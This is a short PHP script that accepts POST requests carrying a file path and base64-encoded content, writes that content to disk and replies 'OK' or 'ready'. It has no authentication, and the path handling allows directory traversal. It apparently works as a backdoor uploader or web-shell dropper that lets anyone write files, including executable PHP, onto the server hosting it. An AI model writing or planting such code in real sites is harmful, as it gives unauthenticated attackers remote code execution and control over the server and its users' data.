<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = $_POST['f'] ?? '';
    $data = base64_decode($_POST['d'] ?? '');
    $path = __DIR__ . '/' . ltrim($file, '/');
    $dir = dirname($path);
    if (!is_dir($dir)) mkdir($dir, 0755, true);
    file_put_contents($path, $data);
    echo 'OK ' . $file;
    exit;
}
echo 'ready';